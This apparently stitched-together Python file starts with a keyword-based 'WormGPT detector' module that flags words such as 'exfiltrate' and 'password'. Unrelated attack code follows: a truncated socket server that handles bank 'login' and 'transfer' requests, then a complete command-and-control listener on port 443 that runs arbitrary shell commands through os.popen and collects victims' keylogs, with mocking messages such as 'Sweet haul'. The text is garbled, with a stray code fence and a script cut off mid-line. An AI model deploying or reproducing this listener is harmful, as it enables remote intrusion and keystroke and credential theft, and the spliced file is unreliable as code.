"""
cli/wormgpt.py

Sentenial-X WormGPT Detector Module - analyzes adversarial AI inputs
and generates countermeasures.
"""

import asyncio
import time
import json
from cli.memory_adapter import get_adapter
from cli.logger import default_logger

# Mock detection patterns for demonstration (replace with real ML/heuristics)
MALICIOUS_PATTERNS = [
    "bypass", "token", "password", "admin", "exfiltrate", "unauthorized", "SSO"
]

COUNTERMEASURES = {
    "sanitize_prompt": "Remove sensitive info from input",
    "deny_and_alert": "Block request and alert operator",
    "quarantine_session": "Quarantine user/session for review"
}


class WormGPT:
    def __init__(self):
        self.mem = get_adapter()
        self.logger = default_logger

    async def detect(self, prompt: str, temperature: float = 0.7) -> dict:
        """
        Analyze adversarial AI input and return detection & countermeasures.

        :param prompt: User or AI-generated input text
        :param temperature: randomness/exploration factor (0.0-1.0)
        :return: dict with action, prompt risk, detections, countermeasures
        """
        self.logger.info(f"Running WormGPT detection on prompt: '{prompt}' with temp {temperature}")

        await asyncio.sleep(0.1 + temperature * 0.2)  # simulate async processing

        # Simple heuristic detection: check for keywords
        detected = [p for p in MALICIOUS_PATTERNS if p.lower() in prompt.lower()]
        risk_level = "high" if detected else "low"

        response = {
            "action": "wormgpt-detector",
            "prompt": prompt,
            "prompt_risk": risk_level,
            "detections": detected,
            "countermeasures": list(COUNTERMEASURES.keys()) if detected else [],
            "temperature": temperature,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }

        # Log to memory
        await self.mem.log_command(response)

        # Also log to standard logger
        self.logger.debug(f"WormGPT detection result: {json.dumps(response, indent=2)}")

        return response


```python
import socket

def main():
    server = ('192.168.1.105', 4444) # Change to your own IP and port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(server)
    s.listen(5)

    print('[+] Listening for incoming connections...')
    
    while True:
        client_socket, addr = s.accept()
        print('Connection established with %s:%s' % (addr[0], addr[1]))
        
        data = client_socket.recv(1024).decode('utf-8')
        if 'login' in data:
            login(data.split(':'), client_socket)
        elif 'transfer' in data:
            transfer(data.split(':'), client_socket)
            
def login(credentials, cs):
    bank_server = 'www.examplebank.com'
    
    headers = {
      "

import socket
import os
import threading

def log_keys(client_socket, addr):
    keylog = ''
    while True:
        try:
            data = client_socket.recv(1024).decode('utf-8')
            if not data:
                break
            keylog += data
            with open(f'keylog_{addr[0]}.txt', 'a') as f:
                f.write(data)
        except:
            break
    client_socket.close()
    print(f'Keylog for {addr[0]} dumped. Sweet haul.')

def handle_client(client_socket, addr):
    commands = {
        'login': lambda args, cs: cs.send(b'Login successful, sucker.'),
        'transfer': lambda args, cs: cs.send(b'Transfer queued—yeah, right.'),
        'shell': lambda args, cs: cs.send(os.popen(' '.join(args[1:])).read().encode('utf-8')),
        'keylog': lambda args, cs: threading.Thread(target=log_keys, args=(cs, addr)).start()
    }
    data = client_socket.recv(1024).decode('utf-8')
    parts = data.split(':')
    cmd = parts[0].lower()
    with open('log.txt', 'a') as f:
        f.write(f'{addr[0]}:{addr[1]} - {data}\n')
    if cmd in commands:
        commands[cmd](parts, client_socket)
    else:
        client_socket.send(b'Piss off with that command.')
    if cmd!= 'keylog':
        client_socket.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 443))
    s.listen(5)
    print('[+] Listening on 0.0.0.0:443...')
    while True:
        client_socket, addr = s.accept()
        print(f'Connection from {addr[0]}:{addr[1]}')
        threading.Thread(target=handle_client, args=(client_socket, addr)).start()

if __name__ == '__main__':
    main()
